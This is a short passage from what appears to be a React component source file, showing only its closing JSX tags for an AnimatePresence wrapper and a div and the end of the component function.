      </AnimatePresence>
    </div>
  );
};
